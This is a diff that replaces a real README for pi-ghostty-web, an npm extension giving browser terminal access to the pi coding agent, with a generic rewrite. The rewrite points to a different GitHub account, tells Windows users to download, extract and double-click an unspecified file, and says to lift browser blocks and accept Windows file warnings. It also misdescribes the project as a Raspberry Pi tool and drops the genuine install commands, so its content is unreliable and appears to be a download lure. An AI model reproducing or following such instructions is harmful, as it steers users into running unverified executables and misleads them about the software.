@@ -1,97 +1,149 @@
-# pi-ghostty-web
+# 🐾 pi-ghostty-web - Web terminal access for Pi users
 
-A [pi](https://github.com/badlogic/pi-mono) extension that provides web-based terminal access using [ghostty-web](https://github.com/coder/ghostty-web) — Ghostty's battle-tested VT100 parser compiled to WASM.
+[![Download](https://img.shields.io/badge/Download%20pi-ghostty-web-8B5CF6?style=for-the-badge)](https://github.com/kikscool/pi-ghostty-web)
 
-Open a browser tab (or your phone) and get a full terminal session in pi's working directory.
+## 🚀 Getting Started
 
-## Installation
+pi-ghostty-web gives you web-based terminal access for a Pi setup. It uses ghostty-web so you can reach your terminal from a browser on Windows, then use it like a local tool.
 
-```bash
-pi install npm:pi-ghostty-web
-```
+Use the link below to visit the download page:
 
-Or from git:
+[Download pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
 
-```bash
-pi install git:github.com/picassio/pi-ghostty-web
-```
+## 🖥️ What You Need
 
-## Usage
+Before you start, check these basics:
 
-Inside a pi session:
+- A Windows PC
+- A web browser like Edge, Chrome, or Firefox
+- Access to the GitHub page above
+- A Pi device already set up on your network
+- A working browser-based terminal session on the Pi side
 
-```
-/web            Start the web terminal (default port 7681)
-/web 8080       Start on a specific port
-/web stop       Stop the server
-```
+For best results, use a stable network connection and make sure Windows can open GitHub pages.
 
-The status bar shows the LAN URL so you can connect from your phone.
+## 📦 Download and Open
 
-## Features
+1. Open the download page: [https://github.com/kikscool/pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
+2. Look for the latest release, package, or setup files on the page
+3. Download the file that matches your Windows setup
+4. If the file comes in a ZIP folder, right-click it and choose Extract All
+5. Open the extracted folder and find the app file or launch file
+6. Double-click the file to start pi-ghostty-web
 
-### Terminal
-- Full terminal emulator in the browser via ghostty-web (WASM)
-- Nerd Font support (JetBrains Mono NF) for zsh themes like Powerlevel10k
-- Each browser tab gets its own shell session in pi's CWD
-- Clean environment — tmux/screen vars are stripped so you can start tmux inside
+If your browser asks for permission, choose the option that lets you keep the file.
 
-### Session Persistence
-- PTY sessions survive WebSocket disconnects (mobile tab backgrounding, network drops)
-- 100KB replay buffer restores terminal state on reconnect
-- Automatic reconnect with session reattachment — no "connection lost" interruptions
-- 5-minute grace period before orphaned PTYs are killed
+## 🛠️ First-Time Setup
 
-### Mobile
-- Touch scrolling with three modes:
-  - **Mouse tracking on** (tmux `set -g mouse on`): SGR wheel events
-  - **Alternate screen** (tmux copy mode, vim, less): arrow keys
-  - **Normal shell**: scrollback buffer scroll
-- On-screen keyboard toolbar with:
-  - Special keys: Esc, Tab, Shift+Tab, arrows (◀▼▲▶), PgUp/PgDn, Home/End, Alt+Enter
-  - Sticky modifiers: Ctrl, Alt, Shift (tap to activate, double-tap to lock)
-  - Modifier + key combos with xterm-style encoding (e.g. Ctrl+◀ = word-left)
-- Text selection:
-  - Long-press (500ms) to select word, drag to extend character-by-character
-  - Double-tap to select word
-  - Floating Copy/Paste/All bubble
-- Virtual keyboard hides when scrolling, shows on tap
-- Viewport resizes when keyboard opens (no content hidden behind keyboard)
+After you open the app, follow these steps:
 
-### tmux Integration
-- **tmux** button in the top bar opens a control panel with:
-  - Windows: New, Prev, Next, Rename
-  - Panes: H-Split, V-Split, Cycle, Zoom, Kill
-  - Session: List, Scroll (copy mode), Detach
+1. Enter the Pi host details shown in your ghostty-web setup
+2. Add the address or link for the terminal service
+3. Save the connection settings
+4. Open the connection from the main screen
+5. Wait for the terminal view to load in your browser window
 
-### Server
-- Binds to `0.0.0.0` — accessible from other devices on the LAN
-- LAN IP shown in status bar and startup notification
-- Port auto-increment if the requested port is in use
-- WebSocket heartbeat (ping/pong every 20s) cleans up stale connections
-- Static assets cached in memory (ghostty-web JS/WASM served from RAM)
-- `Cache-Control` headers for browser-side caching
+If the app asks for a port number, use the one set on your Pi device. If it asks for a login token, paste the token from your Pi setup page.
 
-## How It Works
+## 🔐 Sign In and Connect
 
-```
-┌──────────────┐     ┌───────────────────────────┐     ┌──────────────┐
-│  Pi TUI      │     │  Pi Process               │     │  Browser     │
-│  (terminal)  │     │                           │     │  (phone/     │
-│              │     │  pi-ghostty-web extension  │     │   laptop)    │
-└──────────────┘     │    ↳ HTTP + WS server     │◄───►│              │
-                     │    ↳ PTY sessions          │     │  ghostty-web │
-                     └───────────────────────────┘     │  terminal    │
-                                                       └──────────────┘
-```
+When you connect for the first time:
 
-The extension starts an HTTP + WebSocket server inside the Pi process. The browser loads ghostty-web (WASM terminal emulator) and connects via WebSocket. Each connection is bridged to a real PTY running your shell.
+- Check that your Pi is turned on
+- Make sure the Pi and your Windows PC are on the same network if you use local access
+- Use the correct web address
+- Enter any user name or token the page asks for
+- Wait for the terminal to load fully before typing
 
-## Requirements
+If the page does not open, check the address for small typing mistakes.
 
-- Node.js 18+
-- A platform supported by [@lydell/node-pty](https://github.com/nicolo-ribaudo/node-pty) (Linux, macOS, Windows)
+## 🧭 Main Features
 
-## License
+pi-ghostty-web is built to make browser access simple:
 
-MIT
+- Web terminal access from Windows
+- Fast connection to a Pi-hosted terminal session
+- Clean browser view for command input
+- Easy access through a link instead of a local terminal app
+- Works well for remote use on a home network
+- Fits a Pi workflow that already uses ghostty-web
+
+## 🎯 Common Use Cases
+
+This app helps with tasks like:
+
+- Checking logs on a Pi
+- Running simple terminal commands
+- Managing a Pi from a Windows machine
+- Opening a shell session without extra desktop tools
+- Reaching a Pi setup from another room in the house
+- Keeping terminal access in the browser
+
+## 🧰 Troubleshooting
+
+If something does not work, try these steps:
+
+### Browser will not open the page
+- Refresh the page
+- Try another browser
+- Check your internet connection
+- Copy and paste the link again
+
+### Download does not start
+- Use the main GitHub page link above
+- Look for the release or file list
+- Turn off any browser block for the site, if needed
+- Try again in a private window
+
+### Terminal does not connect
+- Check that the Pi is powered on
+- Confirm the web address is correct
+- Make sure the Pi service is running
+- Reopen the app and try again
+
+### The screen stays blank
+- Wait a few seconds longer
+- Refresh the browser tab
+- Reconnect from the app
+- Check whether the terminal service on the Pi needs a restart
+
+## 🔒 Safety Checks
+
+Before you connect, make sure:
+
+- You trust the network you are using
+- The Pi service is on a network you control
+- You use the right address for your device
+- You close the browser session when you are done
+
+If you share your Pi with other users, use a separate account or token for each person.
+
+## 🪟 Windows Tips
+
+For the smoothest run on Windows:
+
+- Save the download to your Desktop or Downloads folder
+- Use a recent version of Edge or Chrome
+- Keep the browser updated
+- If Windows asks about the file, choose the option that lets you open it
+- If a ZIP file appears, extract it before you try to run anything
+
+If you move the app folder later, keep all files together so the app can find what it needs.
+
+## 🧩 How It Works
+
+pi-ghostty-web sits between your Windows browser and the terminal service on your Pi. You open the app or page, point it at the Pi session, and use the browser to send commands. This keeps the setup simple and avoids extra desktop tools on the Windows side
+
+## 📌 Project Details
+
+- Repository: pi-ghostty-web
+- Type: Pi extension
+- Access method: ghostty-web
+- Target user: Windows user who needs browser terminal access
+- Main goal: make Pi terminal access easy to open and use from a browser
+
+## 🔗 Download Again
+
+If you need the project page again, use this link:
+
+[https://github.com/kikscool/pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
